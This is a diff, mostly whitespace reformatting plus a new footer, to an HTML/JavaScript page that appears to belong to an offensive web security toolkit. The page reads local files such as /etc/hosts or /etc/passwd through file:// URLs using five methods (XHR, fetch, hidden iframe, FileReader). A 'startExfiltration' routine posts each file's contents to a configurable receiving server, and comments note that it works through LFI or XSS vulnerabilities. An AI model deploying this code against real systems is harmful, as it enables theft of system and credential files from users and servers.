@@ -213,7 +213,7 @@
                 选择一个文件，使用所有5种方法进行读取测试，对比各方法的成功率和性能表现。
                 适合验证不同方法在当前环境下的可用性。
             </div>
-            
+
             <div class="info-box" data-i18n="localfile_section1_info">
                 <strong>提示：</strong> 默认测试 <code>/etc/hosts</code> 文件。此测试不会发送数据到服务器，仅用于验证方法可用性。
             </div>
@@ -221,18 +221,21 @@
             <div class="section-controls">
                 <div class="input-group">
                     <label for="test-file-input" data-i18n="localfile_test_file_label">测试文件路径：</label>
-                    <input type="text" id="test-file-input" value="/etc/hosts" 
-                           data-i18n-placeholder="localfile_test_file_placeholder" 
-                           placeholder="/etc/passwd" style="width: 300px;">
+                    <input type="text" id="test-file-input" value="/etc/hosts"
+                        data-i18n-placeholder="localfile_test_file_placeholder" placeholder="/etc/passwd"
+                        style="width: 300px;">
                 </div>
-                <button class="btn btn-test" id="test-all-btn" onclick="testAllMethods()" data-i18n="localfile_test_button">
+                <button class="btn btn-test" id="test-all-btn" onclick="testAllMethods()"
+                    data-i18n="localfile_test_button">
                     开始测试所有方法
                 </button>
             </div>
 
             <div id="test-results" class="test-results">
-                <h3 style="margin-top: 0; color: var(--primary-color);" data-i18n="localfile_test_results_title">测试结果</h3>
-                <div id="test-results-content" style="font-family: var(--font-mono); font-size: 12px; line-height: 1.8;">
+                <h3 style="margin-top: 0; color: var(--primary-color);" data-i18n="localfile_test_results_title">测试结果
+                </h3>
+                <div id="test-results-content"
+                    style="font-family: var(--font-mono); font-size: 12px; line-height: 1.8;">
                     <!-- Test results will be displayed here -->
                 </div>
             </div>
@@ -253,21 +256,24 @@
             <div class="section-controls">
                 <div class="input-group">
                     <label for="server-url" data-i18n="localfile_server_label">接收服务器地址：</label>
-                <input type="text" id="server-url" value="http://127.0.0.1:8888/recv"
-                           data-i18n-placeholder="localfile_server_placeholder"
-                           placeholder="http://your-server.com/recv" style="width: 350px;">
-            </div>
+                    <input type="text" id="server-url" value="http://127.0.0.1:8888/recv"
+                        data-i18n-placeholder="localfile_server_placeholder" placeholder="http://your-server.com/recv"
+                        style="width: 350px;">
+                </div>
                 <div class="input-group">
                     <label for="method-select" data-i18n="localfile_method_label">选择读取方法：</label>
                     <select id="method-select" style="width: 250px;">
                         <option value="xhr" data-i18n="localfile_method_xhr">1. XHR + FileReader (推荐)</option>
                         <option value="fetch" data-i18n="localfile_method_fetch">2. Fetch API + Blob</option>
-                        <option value="iframe" data-i18n="localfile_method_iframe">3. iframe + contentWindow (仅文本)</option>
+                        <option value="iframe" data-i18n="localfile_method_iframe">3. iframe + contentWindow (仅文本)
+                        </option>
                         <option value="text" data-i18n="localfile_method_text">4. FileReader.readAsText() (仅文本)</option>
-                        <option value="arraybuffer" data-i18n="localfile_method_arraybuffer">5. FileReader.readAsArrayBuffer()</option>
+                        <option value="arraybuffer" data-i18n="localfile_method_arraybuffer">5.
+                            FileReader.readAsArrayBuffer()</option>
                     </select>
                 </div>
-                <button class="btn btn-batch" id="batch-btn" onclick="startExfiltration()" data-i18n="localfile_batch_button">
+                <button class="btn btn-batch" id="batch-btn" onclick="startExfiltration()"
+                    data-i18n="localfile_batch_button">
                     开始批量处理
                 </button>
             </div>
@@ -277,7 +283,8 @@
             </div>
         </div>
 
-        <div style="margin: 20px 0; padding: 15px; background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 4px;">
+        <div
+            style="margin: 20px 0; padding: 15px; background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 4px;">
             <h3 style="margin-top: 0; color: var(--primary-color);">Technical Documentation</h3>
             <div id="method-docs" style="color: var(--text-secondary); font-size: 13px; line-height: 1.6;">
                 <!-- Method documentation will be dynamically loaded here -->
@@ -292,6 +299,34 @@
             <span id="status-text">Idle</span>
             <span id="progress-text">0 / 0</span>
         </div>
+        <!-- Standardized Footer -->
+        <footer class="unified-footer injected-footer">
+            <p>
+                <span>arr0w1 <span style="margin: 0 4px; opacity: 0.3;">|</span> <a href="https://github.com/1135"
+                        target="_blank" class="author-link"
+                        style="color: inherit; text-decoration: none; transition: color 0.2s;"
+                        onmouseover="this.style.color='var(--primary-color)'"
+                        onmouseout="this.style.color='inherit'">1135</a></span>
+                <span style="opacity: 0.2;">|</span>
+                <span class="footer-donation-icons">
+                    <a href="https://buymeacoffee.com/wi11x5" target="_blank" title="Buy me a coffee"
+                        class="donation-link">
+                        <img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee">
+                    </a>
+                    <a href="https://ko-fi.com/wi11x5" target="_blank" title="Ko-fi" class="donation-link">
+                        <img src="https://storage.ko-fi.com/cdn/cup-border.png" alt="Ko-fi">
+                    </a>
+                </span>
+            </p>
+        </footer>
+
+        <!-- Floating Buttons -->
+        <div id="back-to-top" title="Back to Top">
+            <svg viewBox="0 0 24 24">
+                <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path>
+            </svg>
+        </div>
+
         <!-- 加载统一导航栏 -->
         <script src="../../js/main.js"></script>
         <script>
@@ -421,29 +456,29 @@
             function initMethodDocs() {
                 const methodSelect = document.getElementById('method-select');
                 const methodDocsDiv = document.getElementById('method-docs');
-                
+
                 if (!methodSelect || !methodDocsDiv) {
                     // Retry if DOM not ready
                     setTimeout(initMethodDocs, 100);
                     return;
                 }
-                
+
                 function updateDocs() {
                     const method = methodSelect.value;
                     methodDocsDiv.innerHTML = methodDocs[method] || '';
                 }
-                
+
                 methodSelect.addEventListener('change', updateDocs);
                 updateDocs(); // Initial load
-                
+
                 // Show initial validation status
                 var validation = validatePrerequisites();
                 if (validation.errors.length > 0 || validation.warnings.length > 0) {
                     log('=== Initial Prerequisite Check ===', 'info');
-                    validation.errors.forEach(function(error) {
+                    validation.errors.forEach(function (error) {
                         log('ERROR: ' + error, 'error');
                     });
-                    validation.warnings.forEach(function(warning) {
+                    validation.warnings.forEach(function (warning) {
                         log('WARNING: ' + warning, 'info');
                     });
                 } else {
@@ -463,18 +498,18 @@
                         }
                     }
                 }
-                
+
                 // Update file count when language changes
                 if (typeof window.addEventListener !== 'undefined') {
                     // Use MutationObserver to detect when language changes
-                    var observer = new MutationObserver(function(mutations) {
-                        mutations.forEach(function(mutation) {
+                    var observer = new MutationObserver(function (mutations) {
+                        mutations.forEach(function (mutation) {
                             if (mutation.type === 'attributes' && mutation.attributeName === 'lang') {
                                 setTimeout(updateFileCount, 100);
                             }
                         });
                     });
-                    
+
                     if (document.documentElement) {
                         observer.observe(document.documentElement, {
                             attributes: true,
@@ -482,10 +517,10 @@
                         });
                     }
                 }
-                
+
                 updateFileCount();
             }
-            
+
             // Initialize when DOM is ready
             if (document.readyState === 'loading') {
                 document.addEventListener('DOMContentLoaded', initMethodDocs);
@@ -595,7 +630,7 @@
             }
 
             // ==================== PREREQUISITE VALIDATION ====================
-            
+
             /**
              * Validates prerequisites for local file access
              * Note: These methods work in TWO scenarios:
@@ -606,7 +641,7 @@
              */
             function validatePrerequisites() {
                 var result = { valid: true, errors: [], warnings: [] };
-                
+
                 // Check protocol - but don't block if not file:// (could be vulnerable web context)
                 var protocol = window.location.protocol;
                 if (protocol === 'file:') {
@@ -614,29 +649,29 @@
                 } else {
                     result.warnings.push('Running via ' + protocol + ' protocol. This works if server has LFI/XSS vulnerability allowing file:// URLs.');
                 }
-                
+
                 // Check browser support
                 if (typeof XMLHttpRequest === 'undefined' && typeof ActiveXObject === 'undefined') {
                     result.valid = false;
                     result.errors.push('XMLHttpRequest not available');
                 }
-                
+
                 if (typeof FileReader === 'undefined') {
                     result.valid = false;
                     result.errors.push('FileReader API not available');
                 }
-                
+
                 // Check Fetch API (for Method 2)
                 if (typeof fetch === 'undefined') {
                     result.warnings.push('Fetch API not available (Method 2 will not work)');
                 }
-                
+
                 // Browser-specific checks (only warnings, not errors)
                 var userAgent = navigator.userAgent.toLowerCase();
                 if ((userAgent.indexOf('chrome') > -1 || userAgent.indexOf('edge') > -1) && protocol === 'file:') {
                     result.warnings.push('Chrome/Edge: file:// XHR may be blocked. Use --allow-file-access-from-files flag, or use in vulnerable web context.');
                 }
-                
+
                 return result;
             }
 
@@ -682,7 +717,7 @@
                     log(`Fetch API not available for ${filename}`, 'error');
                     return;
                 }
-                
+
                 fetch(url)
                     .then(response => {
                         if (response.status === 200 || response.status === 0) {
@@ -718,32 +753,32 @@
                 iframe.style.display = 'none';
                 iframe.style.width = '0';
                 iframe.style.height = '0';
-                
-                var timeout = setTimeout(function() {
+
+                var timeout = setTimeout(function () {
                     log(`Iframe timeout for ${filename}`, 'error');
                     try {
                         document.body.removeChild(iframe);
-                    } catch(e) {}
+                    } catch (e) { }
                 }, 10000); // 10 second timeout
-                
+
                 iframe.onload = function () {
                     clearTimeout(timeout);
                     try {
                         var content = null;
                         try {
                             content = iframe.contentWindow.document.body.innerText ||
-                                     iframe.contentWindow.document.body.textContent;
+                                iframe.contentWindow.document.body.textContent;
                         } catch (e1) {
                             try {
                                 content = iframe.contentDocument.body.innerText ||
-                                         iframe.contentDocument.body.textContent;
+                                    iframe.contentDocument.body.textContent;
                             } catch (e2) {
                                 log(`Cannot access iframe content for ${filename}: ${e2.message}`, 'error');
                                 document.body.removeChild(iframe);
                                 return;
                             }
                         }
-                        
+
                         if (content) {
                             // Convert text to base64
                             var base64 = btoa(unescape(encodeURIComponent(content)));
@@ -757,17 +792,17 @@
                     }
                     try {
                         document.body.removeChild(iframe);
-                    } catch(e) {}
+                    } catch (e) { }
                 };
-                
-                iframe.onerror = function() {
+
+                iframe.onerror = function () {
                     clearTimeout(timeout);
                     log(`Iframe load error for ${filename}`, 'error');
                     try {
                         document.body.removeChild(iframe);
-                    } catch(e) {}
+                    } catch (e) { }
                 };
-                
+
                 iframe.src = url;
                 document.body.appendChild(iframe);
             }
@@ -1105,21 +1140,21 @@
             function startExfiltration() {
                 // Validate prerequisites first (warnings only, no blocking)
                 var validation = validatePrerequisites();
-                
+
                 if (validation.errors.length > 0) {
                     log('=== PREREQUISITE VALIDATION FAILED ===', 'error');
-                    validation.errors.forEach(function(error) {
+                    validation.errors.forEach(function (error) {
                         log('ERROR: ' + error, 'error');
                     });
                     log('Cannot proceed. Please fix the errors above.', 'error');
                     return;
                 }
-                
+
                 // Show warnings but don't block execution
                 // Methods work in both file:// and vulnerable web contexts
                 if (validation.warnings.length > 0) {
                     log('=== PREREQUISITE INFORMATION ===', 'info');
-                    validation.warnings.forEach(function(warning) {
+                    validation.warnings.forEach(function (warning) {
                         log('INFO: ' + warning, 'info');
                     });
                     log('Proceeding with exfiltration...', 'info');
@@ -1145,7 +1180,7 @@
 
                 // Select the appropriate read function based on method
                 var readFunction;
-                switch(method) {
+                switch (method) {
                     case 'xhr':
                         readFunction = sendGetRequestForB64File_XHR;
                         break;
@@ -1173,36 +1208,36 @@
                         readFunction(file_path, file, function (filename, response) {
                             if (response && response.length > 0) {
                                 successCount++;
-                            log(`SUCCESS: Read ${filename} (${response.length} bytes)`, 'success');
+                                log(`SUCCESS: Read ${filename} (${response.length} bytes)`, 'success');
 
-                            sendPostRequest(
-                                serverUrl,
-                                'name=' + escape(filename) + '&' + 'content=' + escape(response),
-                                { "Content-type": "application/x-www-form-urlencoded" },
-                                function (a) {
-                                    log(`Exfiltrated ${filename} to server`, 'success');
-                                }
-                            );
+                                sendPostRequest(
+                                    serverUrl,
+                                    'name=' + escape(filename) + '&' + 'content=' + escape(response),
+                                    { "Content-type": "application/x-www-form-urlencoded" },
+                                    function (a) {
+                                        log(`Exfiltrated ${filename} to server`, 'success');
+                                    }
+                                );
                             } else {
                                 errorCount++;
                                 log(`FAILED: Empty or invalid response for ${filename}`, 'error');
                             }
 
-                        processed++;
+                            processed++;
                             document.getElementById('progress-text').innerText = `${processed} / ${files.length} (Success: ${successCount}, Errors: ${errorCount})`;
 
-                        if (processed === files.length) {
-                            document.getElementById('status-text').innerText = "Completed";
-                            log(`=== Exfiltration batch completed ===`, 'info');
-                            log(`Total: ${files.length}, Success: ${successCount}, Errors: ${errorCount}`, 'info');
-                            
-                            // Re-enable button
-                            var batchBtn = document.getElementById('batch-btn');
-                            if (batchBtn && typeof window.i18n !== 'undefined') {
-                                batchBtn.disabled = false;
-                                batchBtn.textContent = window.i18n('localfile_batch_button');
+                            if (processed === files.length) {
+                                document.getElementById('status-text').innerText = "Completed";
+                                log(`=== Exfiltration batch completed ===`, 'info');
+                                log(`Total: ${files.length}, Success: ${successCount}, Errors: ${errorCount}`, 'info');
+
+                                // Re-enable button
+                                var batchBtn = document.getElementById('batch-btn');
+                                if (batchBtn && typeof window.i18n !== 'undefined') {
+                                    batchBtn.disabled = false;
+                                    batchBtn.textContent = window.i18n('localfile_batch_button');
+                                }
                             }
-                        }
                         });
                     }, index * 200); // Stagger requests slightly
                 });
@@ -1212,7 +1247,7 @@
             function testAllMethods() {
                 var testFileInput = document.getElementById('test-file-input');
                 var testFile = testFileInput ? testFileInput.value.trim() : '/etc/hosts';
-                
+
                 if (!testFile || testFile === '') {
                     var msg = (typeof window.i18n !== 'undefined') ? window.i18n('localfile_test_empty_file') : '请输入要测试的文件路径';
                     alert(msg);
@@ -1251,13 +1286,13 @@
                 var totalMethods = 5;
 
                 function updateResults() {
-                    var i18n = (typeof window.i18n !== 'undefined') ? window.i18n : function(key) { return key; };
+                    var i18n = (typeof window.i18n !== 'undefined') ? window.i18n : function (key) { return key; };
                     var html = '<div style="margin-bottom: 10px; color: var(--text-secondary); font-size: 13px;">';
                     html += '<strong>' + i18n('localfile_test_file_label_result') + '</strong><code>' + testFile + '</code>';
                     html += '</div>';
                     html += '<table style="width: 100%; border-collapse: collapse; margin-top: 10px;">';
                     html += '<tr style="background: var(--border-color);"><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_method') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_status') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_length') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_time') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_note') + '</th></tr>';
-                    
+
                     var methods = [
                         { key: 'xhr', name: '1. XHR + FileReader' },
                         { key: 'fetch', name: '2. Fetch API + Blob' },
@@ -1266,13 +1301,13 @@
                         { key: 'arraybuffer', name: '5. FileReader.readAsArrayBuffer()' }
                     ];
 
-                    methods.forEach(function(method) {
+                    methods.forEach(function (method) {
                         var result = results[method.key];
-                        var statusColor = result.status === 'success' ? '#2ecc71' : 
-                                         result.status === 'error' ? '#e74c3c' : '#f39c12';
-                        var statusText = result.status === 'success' ? i18n('localfile_test_status_success') : 
-                                        result.status === 'error' ? i18n('localfile_test_status_error') : i18n('localfile_test_status_pending');
-                        
+                        var statusColor = result.status === 'success' ? '#2ecc71' :
+                            result.status === 'error' ? '#e74c3c' : '#f39c12';
+                        var statusText = result.status === 'success' ? i18n('localfile_test_status_success') :
+                            result.status === 'error' ? i18n('localfile_test_status_error') : i18n('localfile_test_status_pending');
+
                         html += '<tr>';
                         html += '<td style="padding: 8px; border: 1px solid var(--border-color);"><strong>' + method.name + '</strong></td>';
                         html += '<td style="padding: 8px; border: 1px solid var(--border-color); color: ' + statusColor + '; font-weight: 500;">' + statusText + '</td>';
@@ -1303,11 +1338,11 @@
                         html += '<h4 style="margin-top: 0;">' + i18n('localfile_test_summary_title') + '</h4>';
                         html += '<p><strong>' + i18n('localfile_test_summary_success') + '</strong> <span style="color: #2ecc71;">' + successCount + ' / ' + totalMethods + '</span></p>';
                         html += '<p><strong>' + i18n('localfile_test_summary_failed') + '</strong> <span style="color: #e74c3c;">' + errorCount + ' / ' + totalMethods + '</span></p>';
-                        
+
                         // Show recommendation
                         if (successCount > 0) {
                             var recommendedMethods = [];
-                            methods.forEach(function(method) {
+                            methods.forEach(function (method) {
                                 if (results[method.key].status === 'success') {
                                     var methodName = method.name.split('.')[1].trim();
                                     recommendedMethods.push(methodName);
@@ -1315,7 +1350,7 @@
                             });
                             html += '<p style="margin-top: 10px;"><strong>' + i18n('localfile_test_recommended') + '</strong> ' + recommendedMethods.join(', ') + '</p>';
                         }
-                        
+
                         // Check if all successful methods return same data
                         var successfulData = [];
                         for (var key in results) {
@@ -1323,7 +1358,7 @@
                                 successfulData.push({ method: key, data: results[key].data });
                             }
                         }
-                        
+
                         if (successfulData.length > 1) {
                             var allSame = true;
                             var firstData = successfulData[0].data;
@@ -1346,10 +1381,10 @@
                 }
 
                 // Test Method 1: XHR
-                (function() {
+                (function () {
                     var methodStart = Date.now();
                     try {
-                        sendGetRequestForB64File_XHR(testUrl, testFile, function(filename, data) {
+                        sendGetRequestForB64File_XHR(testUrl, testFile, function (filename, data) {
                             results.xhr.status = 'success';
                             results.xhr.data = data;
                             results.xhr.time = Date.now() - methodStart;
@@ -1359,7 +1394,7 @@
                             updateResults();
                         });
                         // Set timeout for XHR
-                        setTimeout(function() {
+                        setTimeout(function () {
                             if (results.xhr.status === 'pending') {
                                 results.xhr.status = 'error';
                                 results.xhr.error = 'Timeout (10s)';
@@ -1380,7 +1415,7 @@
                 })();
 
                 // Test Method 2: Fetch
-                (function() {
+                (function () {
                     var methodStart = Date.now();
                     if (typeof fetch === 'undefined') {
                         results.fetch.status = 'error';
@@ -1392,7 +1427,7 @@
                         return;
                     }
                     try {
-                        sendGetRequestForB64File_Fetch(testUrl, testFile, function(filename, data) {
+                        sendGetRequestForB64File_Fetch(testUrl, testFile, function (filename, data) {
                             results.fetch.status = 'success';
                             results.fetch.data = data;
                             results.fetch.time = Date.now() - methodStart;
@@ -1401,7 +1436,7 @@
                             log('Method 2 (Fetch): SUCCESS - ' + data.length + ' bytes', 'success');
                             updateResults();
                         });
-                        setTimeout(function() {
+                        setTimeout(function () {
                             if (results.fetch.status === 'pending') {
                                 results.fetch.status = 'error';
                                 results.fetch.error = 'Timeout (10s)';
@@ -1422,10 +1457,10 @@
                 })();
 
                 // Test Method 3: iframe
-                (function() {
+                (function () {
                     var methodStart = Date.now();
                     try {
-                        readFileViaIframe(testUrl, testFile, function(filename, data) {
+                        readFileViaIframe(testUrl, testFile, function (filename, data) {
                             results.iframe.status = 'success';
                             results.iframe.data = data;
                             results.iframe.time = Date.now() - methodStart;
@@ -1434,7 +1469,7 @@
                             log('Method 3 (iframe): SUCCESS - ' + data.length + ' bytes', 'success');
                             updateResults();
                         });
-                        setTimeout(function() {
+                        setTimeout(function () {
                             if (results.iframe.status === 'pending') {
                                 results.iframe.status = 'error';
                                 results.iframe.error = 'Timeout (10s) or blocked by browser';
@@ -1455,10 +1490,10 @@
                 })();
 
                 // Test Method 4: readAsText
-                (function() {
+                (function () {
                     var methodStart = Date.now();
                     try {
-                        readFileAsText(testUrl, testFile, function(filename, data) {
+                        readFileAsText(testUrl, testFile, function (filename, data) {
                             results.text.status = 'success';
                             results.text.data = data;
                             results.text.time = Date.now() - methodStart;
@@ -1467,7 +1502,7 @@
                             log('Method 4 (readAsText): SUCCESS - ' + data.length + ' bytes', 'success');
                             updateResults();
                         });
-                        setTimeout(function() {
+                        setTimeout(function () {
                             if (results.text.status === 'pending') {
                                 results.text.status = 'error';
                                 results.text.error = 'Timeout (10s)';
@@ -1488,10 +1523,10 @@
                 })();
 
                 // Test Method 5: readAsArrayBuffer
-                (function() {
+                (function () {
                     var methodStart = Date.now();
                     try {
-                        readFileAsArrayBuffer(testUrl, testFile, function(filename, data) {
+                        readFileAsArrayBuffer(testUrl, testFile, function (filename, data) {
                             results.arraybuffer.status = 'success';
                             results.arraybuffer.data = data;
                             results.arraybuffer.time = Date.now() - methodStart;
@@ -1500,7 +1535,7 @@
                             log('Method 5 (readAsArrayBuffer): SUCCESS - ' + data.length + ' bytes', 'success');
                             updateResults();
                         });
-                        setTimeout(function() {
+                        setTimeout(function () {
                             if (results.arraybuffer.status === 'pending') {
                                 results.arraybuffer.status = 'error';
                                 results.arraybuffer.error = 'Timeout (10s)';
